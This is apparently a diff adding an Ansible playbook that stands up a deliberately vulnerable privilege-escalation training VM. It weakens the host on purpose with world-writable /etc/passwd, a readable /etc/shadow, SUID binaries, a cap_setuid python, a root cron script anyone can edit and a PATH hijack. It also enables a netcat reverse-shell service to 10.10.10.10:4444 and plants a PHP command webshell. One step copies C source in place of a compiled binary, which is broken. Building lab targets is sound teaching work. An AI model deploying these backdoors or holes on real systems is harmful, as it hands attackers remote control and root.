@@ -1,0 +1,168 @@
+---
+- name: Deploy a Linux Privilege Escalation Training VM
+  hosts: ubuntu_target
+  become: true
+  vars:
+    trainee_user: "hackerman"
+    trainee_pass: "{{ 'toor' | password_hash('sha512') }}"
+    flag_hash: "{{ lookup('password', '/dev/null length=64 chars=hex') }}"
+  tasks:
+    - name: Create user {{ trainee_user }}
+      user:
+        name: "{{ trainee_user }}"
+        password: "{{ trainee_pass }}"
+        shell: /bin/bash
+        groups: sudo
+
+    - name: Allow passwordless sudo on vim
+      copy:
+        dest: "/etc/sudoers.d/{{ trainee_user }}"
+        content: "{{ trainee_user }} ALL=(ALL) NOPASSWD: /usr/bin/vim"
+        mode: '0440'
+
+    - name: Create .scripts directory for PATH hijack
+      file:
+        path: "/home/{{ trainee_user }}/.scripts"
+        state: directory
+        owner: "{{ trainee_user }}"
+        group: "{{ trainee_user }}"
+        mode: '0755'
+
+    - name: Make /etc/passwd world-writable
+      file:
+        path: /etc/passwd
+        mode: '0666'
+
+    - name: Make /etc/shadow world-readable
+      file:
+        path: /etc/shadow
+        mode: '0644'
+
+    - name: Install system dependencies
+      apt:
+        name:
+          - apache2
+          - php
+          - curl
+          - gcc
+          - make
+          - netcat-openbsd
+          - python3
+          - libcap2-bin
+          - build-essential
+          - sudo
+          - vim
+          - findutils
+          - less
+          - cron
+          - unzip
+        state: present
+        update_cache: yes
+
+    - name: Deploy flag in /root/root.txt
+      copy:
+        dest: /root/root.txt
+        content: "{{ flag_hash }}"
+        mode: '0600'
+
+    - name: Deploy SUID GTFObin (find)
+      file:
+        path: /usr/bin/find
+        mode: '4755'
+
+    - name: Deploy SUID GTFObin (less)
+      file:
+        path: /usr/bin/less
+        mode: '4755'
+
+    - name: Deploy SUID GTFObin (vim)
+      file:
+        path: /usr/bin/vim
+        mode: '4755'
+
+    - name: Find real path of python3
+      command: readlink -f /usr/bin/python3
+      register: python_real_path
+      changed_when: false
+
+    - name: Set capability on real python binary
+      command: setcap cap_setuid+ep {{ python_real_path.stdout }}
+
+    - name: Ensure /opt/scripts directory exists
+      file:
+        path: /opt/scripts
+        state: directory
+        owner: "{{ trainee_user }}"
+        group: "{{ trainee_user }}"
+        mode: '0755'
+
+    - name: Create world-writable cron script
+      copy:
+        dest: /opt/scripts/cronjob.sh
+        content: |
+          #!/bin/bash
+          echo "Running cron as root" > /tmp/cron_marker
+        mode: '0777'
+        owner: "{{ trainee_user }}"
+        group: "{{ trainee_user }}"
+
+    - name: Create root cronjob pointing to user-editable script
+      copy:
+        dest: /etc/cron.d/user_cron
+        content: "* * * * * root /opt/scripts/cronjob.sh"
+        mode: '0666'
+
+    - name: Setup PATH hijack environment
+      copy:
+        dest: /home/{{ trainee_user }}/.scripts/cp
+        content: |
+          #!/bin/bash
+          /bin/bash
+        owner: "{{ trainee_user }}"
+        group: "{{ trainee_user }}"
+        mode: '0755'
+
+    - name: Add custom PATH to .bashrc
+      lineinfile:
+        path: "/home/{{ trainee_user }}/.bashrc"
+        line: 'export PATH=/home/{{ trainee_user }}/.scripts:$PATH'
+        owner: "{{ trainee_user }}"
+        group: "{{ trainee_user }}"
+
+    - name: Deploy LD_PRELOAD vulnerable binary
+      copy:
+        dest: /usr/local/bin/log
+        content: |
+          #include <stdio.h>
+          int main() {
+            printf("Logging started...\n");
+            return 0;
+          }
+        mode: '0755'
+
+    - name: Setup systemd reverse shell service
+      copy:
+        dest: /etc/systemd/system/revsh.service
+        content: |
+          [Unit]
+          Description=Reverse shell
+          After=network.target
+
+          [Service]
+          ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.10.10 4444'
+          Restart=always
+
+          [Install]
+          WantedBy=multi-user.target
+        mode: '0666'
+
+    - name: Enable reverse shell service
+      command: systemctl enable revsh.service
+      ignore_errors: yes
+
+    - name: Deploy webshell in Apache2
+      copy:
+        dest: /var/www/html/index.php
+        content: |
+          <?php echo system($_GET['cmd']); ?>
+        mode: '0777'
